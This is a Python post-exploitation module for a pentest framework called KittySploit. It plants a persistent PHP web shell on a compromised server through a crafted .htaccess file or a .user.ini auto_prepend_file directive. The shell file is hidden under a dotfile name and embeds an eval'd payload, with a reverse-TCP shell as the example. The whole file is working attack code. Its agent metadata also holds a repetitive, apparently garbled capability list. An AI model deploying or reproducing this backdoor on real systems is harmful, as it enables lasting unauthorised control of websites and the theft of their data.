#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.php.helpers import PhpPostHelper


class Module(Post, PhpPostHelper):
    __info__ = {
        "name": "PHP Auto-Prepend Combo (.htaccess + .user.ini)",
        "description": (
            "Detects Apache/mod_php vs PHP-FPM/Nginx stack from a PHP session and deploys "
            "persistence via .htaccess, .user.ini, or both (best-effort auto selection)."
        ),
        "author": "KittySploit Team",
        "arch": Arch.PHP,
        "session_type": SessionType.PHP,
        "tags": ["php", "persistence", "htaccess", "user.ini", "web"],
        "references": ["https://github.com/wireghoul/htshells"],
    'agent': {
        'risk': 'destructive',
        'effects': ['target_modification', 'config_changes'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    web_dir = OptString("", "Web directory (empty = DOCUMENT_ROOT or getcwd())", False)
    deploy_mode = OptChoice(
        "auto",
        "Deploy: auto, htaccess, user_ini, or both",
        False,
        choices=["auto", "htaccess", "user_ini", "both"],
    )
    shell_name = OptString(".ks-prepend.php", "PHP shell filename under web_dir", False)
    ini_mode = OptChoice("prepend", "user.ini directive", False, choices=["prepend", "append"])
    payload_path = OptString("", "Payload module (e.g. payloads/singles/cmd/php/reverse_tcp)", True)
    lhost = OptString("", "Local host for reverse payloads", False)
    lport = OptPort(4444, "Local port for reverse payloads", False)

    def _shell_path(self, web: str) -> str:
        name = self._opt(self.shell_name).lstrip("/") or ".ks-prepend.php"
        return f"{web.rstrip('/')}/{name}"

    def _deploy_htaccess(self, web: str, shell_path: str, embedded: str) -> bool:
        ht_path = f"{web.rstrip('/')}/.htaccess"
        content = f"""<Files ~ "^\\.ht">
  Require all granted
</Files>

php_flag engine on
SetHandler application/x-httpd-php

###### SHELL ###### <?php {embedded} ?>
"""
        print_status(f"Writing {ht_path}")
        return self.php_write_file(ht_path, content, mode=0o755)

    def _deploy_user_ini(self, web: str, shell_path: str, embedded: str) -> bool:
        ini_path = f"{web.rstrip('/')}/.user.ini"
        directive = "auto_prepend_file" if self._opt(self.ini_mode) == "prepend" else "auto_append_file"
        ini_content = (
            f'{directive} = "{shell_path}"\n'
            'user_ini.filename = ".user.ini"\n'
            "user_ini.cache_ttl = 5\n"
        )
        print_status(f"Writing shell {shell_path}")
        if not self.php_write_file(shell_path, f"<?php {embedded} ?>\n", mode=0o644):
            return False
        print_status(f"Writing {ini_path}")
        return self.php_write_file(ini_path, ini_content, mode=0o644)

    def check(self):
        stack = self.php_detect_stack(self._opt(self.web_dir))
        flags = self.parse_stack_flags(stack)
        if not flags["web_dir"]:
            print_error("Could not determine web directory")
            return False
        methods = self.choose_prepend_methods(stack, self._opt(self.deploy_mode))
        if not methods:
            print_error(
                f"No viable technique (SAPI={flags['sapi']}, "
                f"htaccess={flags['writable_htaccess']}, user_ini={flags['writable_user_ini']})"
            )
            return False
        print_success(f"Stack: {flags['sapi']} / {flags['server']}")
        print_info(f"Web dir: {flags['web_dir']}")
        print_info(f"Selected technique(s): {', '.join(methods)}")
        return True

    def run(self):
        stack = self.php_detect_stack(self._opt(self.web_dir))
        flags = self.parse_stack_flags(stack)
        web = flags["web_dir"]
        if not web:
            raise ProcedureError(FailureType.NotFound, "Could not determine web directory")

        methods = self.choose_prepend_methods(stack, self._opt(self.deploy_mode))
        if not methods:
            raise ProcedureError(
                FailureType.NotVulnerable,
                "No writable .htaccess or .user.ini target for current stack/mode",
            )

        encoded = self.generate_payload(self._opt(self.payload_path))
        embedded = self.embed_eval_payload(encoded)
        shell_path = self._shell_path(web)
        ok = False

        for method in methods:
            if method == "htaccess":
                ok = self._deploy_htaccess(web, shell_path, embedded) or ok
            elif method == "user_ini":
                ok = self._deploy_user_ini(web, shell_path, embedded) or ok

        if not ok:
            raise ProcedureError(FailureType.PayloadFailed, "Failed to deploy auto-prepend persistence")

        print_good(f"Auto-prepend persistence deployed via: {', '.join(methods)}")
        print_status(f"Web root: {web}")
        return True
